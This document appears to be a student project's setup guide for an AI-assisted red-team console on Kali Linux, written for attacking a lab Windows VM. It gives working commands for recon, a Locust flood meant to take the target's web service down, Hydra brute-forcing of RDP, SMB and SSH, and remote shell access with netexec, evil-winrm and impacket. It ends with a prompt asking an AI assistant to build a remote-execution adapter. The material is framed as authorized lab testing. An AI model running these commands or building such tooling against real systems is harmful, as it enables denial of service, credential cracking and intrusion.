# AI RED TEAM on Kali — Complete Setup & Attack Guide

**Written for:** you, setting the project up on a **Kali Linux** attacker machine to
run the three attacks (DDoS, Brute-force, Remote Access) against an **authorized
lab Windows target** identified by IP.

> ⚠️ **Scope:** Only run this against the lab VM you are **authorized** to test, on
> an **isolated lab network**. Never against internet-facing or shared-hosted
> systems. All tooling runs on **Kali (your machine)** — nothing is installed on
> the target; you only reach it over the network by IP.

Kali is the recommended platform: `hydra`, `nmap`, `netexec`, `impacket`,
`evil-winrm` are all native — no WSL shim, no Windows firewall/loopback drama.

---

## 0. The big picture

```
   KALI (your machine)                         TARGET (Windows VM, by IP)
 ┌──────────────────────┐                     ┌─────────────────────────┐
 │ AI RED TEAM console │   network / IP      │  open services:         │
 │  backend + frontend  │ ──────────────────▶ │   80/443 web  → DDoS    │
 │  AI decision engine  │                     │   3389 RDP    → Brute   │
 │  hydra/locust/nxc... │ ◀────────────────── │   445 SMB     → Brute   │
 └──────────────────────┘   telemetry/results │   5985 WinRM  → Remote  │
                                              └─────────────────────────┘
```

Attack lands only where a **service/port is open + reachable**. First step is
always **recon** to see what's open.

| # | Attack | Lands on | Needs |
|---|--------|----------|-------|
| 1 | **DDoS** (Locust) | a web service (80/443/8080) | HTTP service open |
| 2 | **Brute-force** (Hydra) | a login service (RDP/SMB/SSH) | auth port open |
| 3 | **Remote Access** (netexec/evil-winrm) — *RAT alternate* | WinRM/SMB with **valid creds** | creds from step 2 + 445/5985 open |

---

## 1. Install prerequisites (on Kali)

```bash
sudo apt update
sudo apt install -y git python3 python3-venv python3-pip nodejs npm \
                    nmap hydra netexec impacket-scripts evil-winrm
# hydra, nmap, netexec usually pre-installed on Kali — the command is idempotent.
```

Verify:
```bash
git --version; python3 --version; node --version; npm --version
hydra -h | head -1; nmap --version | head -1; nxc --version; evil-winrm --version
```

---

## 2. Get the project onto Kali

```bash
cd ~
git clone <YOUR_REPO_URL> red-team-chakravyuh      # or scp/USB copy
cd red-team-chakravyuh
```
From here, the base path is **`~/red-team-chakravyuh`** (adjust in paths below).

---

## 3. Backend (native — no pywin32)

```bash
cd ~/red-team-chakravyuh/backend
python3 -m venv .venv
source .venv/bin/activate
pip install -r requirements.txt
pip install locust                       # the DDoS load driver
cp .env.example .env
```
> **Do NOT install pywin32** — it is Windows-only. On Linux the collector uses
> psutil; for a remote target you use WinRM or `none` (see §5).

Run it (keep this terminal open):
```bash
python -m uvicorn app.main:app --host 127.0.0.1 --port 8077
```
Health check: <http://127.0.0.1:8077/api/health> → `{"status":"ok"}`.

---

## 4. Frontend (second terminal)

```bash
cd ~/red-team-chakravyuh/frontend
npm install
npm run dev            # http://localhost:5173
```
Open the dashboard: **http://localhost:5173**

---

## 5. Configure `.env` (the one place you wire the target)

Edit `~/red-team-chakravyuh/backend/.env`. Replace `<TARGET_IP>` everywhere.

```ini
# ---------- AI engine (REQUIRED for it to be AI-driven) ----------
# Without a key the agent honestly returns "llm_unavailable" and uses non-AI
# defaults. Put a real OpenRouter key here to make the decisions AI-driven.
OPENROUTER_API_KEY=<your-openrouter-key>
OPENROUTER_MODEL=anthropic/claude-sonnet-4.5

# ---------- Telemetry ----------
# Target pe WinRM enabled + creds hain to winrm; warna none (attack layer phir bhi chalega)
TELEMETRY_SOURCE=none
# TELEMETRY_SOURCE=winrm
# WINRM_ENDPOINT=<TARGET_IP>
# WINRM_USER=<lab-user>
# WINRM_PASSWORD=<lab-pass>

# ---------- Attack 2: Brute-force (Hydra, native) ----------
HYDRA_BIN=hydra
HYDRA_ENABLED=true
HYDRA_TARGET=<TARGET_IP>
HYDRA_SERVICE=rdp                 # rdp / smb / ssh / ftp — jo open ho
HYDRA_PORT=3389                   # service ke hisaab se (rdp 3389, smb 445, ssh 22)
HYDRA_USERLIST_PATH=/home/kali/red-team-chakravyuh/backend/tools/users.txt
HYDRA_PASSLIST_PATH=/home/kali/red-team-chakravyuh/backend/tools/passwords.txt
HYDRA_MAX_TASKS=4
HYDRA_MAX_ATTEMPTS=500
HYDRA_MAX_RUN_SECONDS=120

# ---------- Attack 1: DDoS (Locust) ----------
LOCUST_ENABLED=true
LOCUST_TARGET_URL=http://<TARGET_IP>:80           # target ki web service
LOCUST_FILE_PATH=/home/kali/red-team-chakravyuh/locust-master/examples/vajra_load.py
LOCUST_MAX_USERS=50
LOCUST_MAX_SPAWN_RATE=10
LOCUST_MAX_RUN_SECONDS=120
```
> `.env` badalne ke baad **backend restart** karo (settings startup pe load hoti hain).

---

## 6. STEP 1 — Recon (always do this first)

IP milte hi dekho kya khula hai — isse decide hoga kaun sa attack chalega:

```bash
# quick service + version scan
nmap -sV -Pn <TARGET_IP>

# Windows-focused enumeration (shares, users, OS)
nmap -p 445,3389,5985,80,443 --script smb-os-discovery,smb-enum-shares,rdp-ntlm-info -Pn <TARGET_IP>
```
Read the output:
- `80/443/8080 open` → **DDoS** possible
- `3389 open` → **Brute-force (rdp)**
- `445 open` → Brute-force (smb) + later Remote Access
- `5985 open` → Remote Access (WinRM) once you have creds
- Sab band → us VM pe network attack nahi land hoga (firewall) — honest reality

---

## 7. STEP 2 — Attack 1: DDoS

**When:** target pe HTTP service (80/443/8080) khula ho.
Set `LOCUST_TARGET_URL=http://<TARGET_IP>:<port>` in `.env`, restart backend, then
on the dashboard: **DDoS / Locust panel → Run load test** (50 users). The target's
web service should slow to timeouts / go unavailable; the panel shows live
Requests / Req-s / Failures.

CLI equivalent (optional):
```bash
cd ~/red-team-chakravyuh/locust-master/examples
locust -f vajra_load.py --host http://<TARGET_IP>:80 --headless -u 50 -r 10 -t 30s
```

---

## 8. STEP 3 — Attack 2: Brute-force (Hydra)

**When:** a login service is open. Pick the service + port in `.env`:
- RDP → `HYDRA_SERVICE=rdp`, `HYDRA_PORT=3389`
- SMB → `HYDRA_SERVICE=smb`, `HYDRA_PORT=445`
- SSH → `HYDRA_SERVICE=ssh`, `HYDRA_PORT=22`

Restart backend, then dashboard: **Integrations → THC-Hydra → Run credential test**.
It tries the user/pass lists against `<TARGET_IP>` and shows the attack
visualization (attempt feed + "CREDENTIAL CRACKED" banner). **Cracked password is
never shown in the UI — note the cracked LOGIN.**

CLI equivalent (to read the actual password for the next step):
```bash
hydra -L backend/tools/users.txt -P backend/tools/passwords.txt \
      -t 4 -f -V rdp://<TARGET_IP>
# SMB:  ... smb://<TARGET_IP>
# SSH:  ... -s 22 <TARGET_IP> ssh
```
➡️ **Save the cracked `user:pass`** — Attack 3 needs it.

---

## 9. STEP 4 — Attack 3: Remote Access (RAT alternate)

**The RAT goal = remote control of the target. You can't drop an implant from just
an IP** — so get it the legitimate way: use the **valid creds from Attack 2** with
Windows' own remote-management services (SMB / WinRM) to run commands on the target.
No implant uploaded, nothing installed on the target.

**When:** you have `user:pass` (from Attack 2) AND 445 (SMB) or 5985 (WinRM) is open,
and the account has rights (admin for SMB exec; "Remote Management Users" for WinRM).

### Option A — netexec (enumeration + command exec)
```bash
# validate creds + run a command over SMB
nxc smb <TARGET_IP> -u <user> -p '<pass>' -x "whoami && hostname"
# enumerate shares / users / sessions
nxc smb <TARGET_IP> -u <user> -p '<pass>' --shares --users --sessions
# over WinRM instead
nxc winrm <TARGET_IP> -u <user> -p '<pass>' -x "whoami"
```

### Option B — evil-winrm (full interactive shell)
```bash
evil-winrm -i <TARGET_IP> -u <user> -p '<pass>'
# then inside: whoami, hostname, ipconfig, dir C:\, etc.
```

### Option C — impacket (semi-interactive shell via SMB/WMI; needs admin)
```bash
impacket-wmiexec '<user>:<pass>@<TARGET_IP>'
impacket-psexec  '<user>:<pass>@<TARGET_IP>'
```

This is your working **3rd attack**: credentialed remote command execution =
"remote access / control" of the Windows target.

### No creds? Fallback 3rd pillar — Recon/Enumeration
If Attack 2 yields no creds, the 3rd capability is attack-surface intelligence
(works on any reachable IP, no creds):
```bash
nmap -sV -sC -Pn <TARGET_IP>
nxc smb <TARGET_IP> -u '' -p ''            # null-session enum (if allowed)
```
Feed the output into the console's analysis layer for AI-driven findings.

---

## 10. The full demo kill-chain (what to show)

1. **Recon** — `nmap <TARGET_IP>` → show open services.
2. **DDoS** — flood the web service → target goes **unavailable**.
3. **Brute-force** — crack a weak RDP/SMB/WinRM credential.
4. **Remote Access** — use that credential with `nxc`/`evil-winrm` → `whoami` on
   the target → **you control the box**.
5. **AI layer** — the agent reads real telemetry/results and produces the decision
   + analysis narrative for each step (needs `OPENROUTER_API_KEY`).

> **Lab tip:** On the target VM, pre-create one **weak demo account** (e.g. a user
> with password `Welcome1`) and enable RDP or WinRM — exactly like the SSH
> `labadmin/Welcome1` demo — so the whole chain runs end-to-end in your lab.

---

## 11. Make it "properly AI-driven"
- Set `OPENROUTER_API_KEY` + `OPENROUTER_MODEL` in `.env` (§5). Without it the engine
  returns honest `llm_unavailable` and decisions are non-AI defaults.
- The AI reads **real telemetry + results** and produces per-module **decisions**
  (attack params) and **analysis** — it never fabricates. Execution is done by the
  tools (hydra/locust/nxc); the AI is the reasoning/analysis brain.

---

## 12. Troubleshooting
| Problem | Fix |
|---------|-----|
| Attack "unavailable" / no connect | Port band ya firewall. `nmap`/`ping` se reachability confirm karo |
| Hydra smb flaky on modern Windows | RDP (3389) try karo — Windows pe zyada reliable |
| Remote Access "access denied" | Account ke rights kam — WinRM ke liye "Remote Management Users", SMB exec ke liye local admin chahiye |
| AI decisions missing | `OPENROUTER_API_KEY` set hai? Backend restart |
| Telemetry empty | Remote host ke liye `TELEMETRY_SOURCE=winrm` + WinRM creds; warna `none` |
| `.env` change nahi dikha | Backend restart (startup pe load hoti hai) |

---

## 13. Completion checklist
- [ ] Kali prereqs installed (hydra, nmap, netexec, impacket, evil-winrm, node, python)
- [ ] Repo cloned; backend venv + deps; frontend `npm install`
- [ ] `OPENROUTER_API_KEY` set (AI-driven)
- [ ] `nmap <TARGET_IP>` done — know the open services
- [ ] `.env` wired to `<TARGET_IP>` for the applicable attacks
- [ ] Attack 1 (DDoS) runs → target web unavailable
- [ ] Attack 2 (Brute-force) runs → credential cracked
- [ ] Attack 3 (Remote Access) runs → `whoami` on target with cracked creds
- [ ] Screenshots/recording for the PPT

---

## 14. Prompt to paste on Kali (for your AI assistant / Claude Code)

When you continue on Kali, paste this to an AI coding assistant to get help
finishing the setup and (optionally) wiring the Remote Access attack into the
dashboard:

```text
I'm running an AUTHORIZED academic red-team lab. My console project
"AI RED TEAM" (FastAPI backend + React frontend) is cloned on this Kali machine
at ~/red-team-chakravyuh. I test ONLY an isolated lab Windows VM I'm authorized to
assess, reachable by IP <TARGET_IP>. Everything runs on Kali; nothing is installed
on the target.

Current state:
- Three attack modules: DDoS (Locust), Brute-force (Hydra), and RAT.
- Integrations live in backend/app/integrations/ behind one adapter interface
  (base.py); existing adapters: hydra, locust, caldera, vervet, pentestgpt. Each is
  fail-closed and degrades honestly. Config is in backend/app/config.py + .env.
- On Kali, hydra/nmap/netexec/impacket/evil-winrm are native.

Please help me:
1. Verify my backend/.env is correctly wired to <TARGET_IP> for the services that
   nmap shows open (I'll paste my nmap output).
2. Build a new fail-closed "remote_access" integration adapter (modeled on the
   hydra adapter) that wraps `netexec` (nxc) for credentialed SMB/WinRM command
   execution against the configured target, using credentials I provide in .env —
   with hard caps, no arbitrary host, and it must NOT echo secrets back to the UI.
3. Wire it into the Integrations page as a third "Remote Access" panel, and into
   the RAT module page, matching the existing Hydra panel's style.
4. Keep the project's safety posture: authorized-lab targets only, fail-closed
   gating, honest "unavailable" when a tool/cred/port is missing.

Start by reading backend/app/integrations/hydra.py and backend/app/api/integrations.py
so the new adapter matches the existing pattern.
```

---

See also: `WINDOWS_VM_SETUP.md` (Windows/Docker), `RUN_SERVERS.md` (local run),
`WORKLOG_2026-11-04.md` (what's built so far).
